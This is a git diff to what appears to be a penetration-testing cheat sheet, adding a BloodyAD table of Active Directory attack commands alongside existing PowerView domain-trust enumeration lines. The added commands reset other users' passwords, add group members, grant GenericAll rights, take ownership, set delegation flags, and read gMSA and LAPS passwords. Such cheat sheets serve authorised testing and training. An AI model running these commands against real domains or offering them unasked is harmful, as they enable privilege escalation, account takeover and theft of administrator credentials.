@@ -17,6 +17,7 @@
 - [11. MSSQLPwner](#MSSQLPwner)
 - [12. NTLM Relay](#NTLM-Relay)
 - [13. MSFVenom Payload Generation Cheetsheet](#MSFVenom-Payload-Generation-Cheetsheet)
+- [15. BloodyAD Cheetsheet](#BloodyAD-``Cheetsheet)
 - [14. Domain Enumeration](#Domain-Enumeration)
 
 
@@ -351,3 +352,18 @@ impacket:
 - `Get-NetDomainTrust` - Map the trusts of the current domain.
 - `Get-NetForestDomain -Forest eurocorp.local -Verbose | Get-NetDomainTrust` - Enumerate trusts for a trusting domain.
 - `Get-NetGPOGroup` -  Get GPO's which use Restricted Groups or groups.xml for interesting users.
+
+# BloodyAD Cheetsheet
+
+| **Purpose**                                           | **Command**                                                                                                                              |
+|-------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|
+| Retrieve User Information                             | `bloodyAD --host $dc -d $domain -u $username -p $password get object $target_username`                                                     |
+| Add User To Group                                     | `bloodyAD --host $dc -d $domain -u $username -p $password add groupMember $group_name $member_to_add`                                      |
+| Change Password                                       | `bloodyAD --host $dc -d $domain -u $username -p $password set password $target_username $new_password`                                      |
+| Give User GenericAll Rights                           | `bloodyAD --host $dc -d $domain -u $username -p $password add genericAll $DN $target_username`                                             |
+| WriteOwner                                            | `bloodyAD --host $dc -d $domain -u $username -p $password set owner $target_group $target_username`                                        |
+| Read GMSA Password                                    | `bloodyAD --host $dc -d $domain -u $username -p $password get object $target_username --attr msDS-ManagedPassword`                        |
+| Enable a Disabled Account                             | `bloodyAD --host $dc -d $domain -u $username -p $password remove uac $target_username -f ACCOUNTDISABLE`                                  |
+| Add The TRUSTED_TO_AUTH_FOR_DELEGATION Flag           | `bloodyAD --host $dc -d $domain -u $username -p $password add uac $target_username -f TRUSTED_TO_AUTH_FOR_DELEGATION`                    |
+| Read LAPS Password                                    | `bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime` |
+| Read LAPS Password (Kerberos Auth)                    | `KRB5CCNAME=ted.ccache bloodyAD -k --dc-ip "192.168.202.120" --host dc03.infinity.com -d "infinity.com" get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime` |
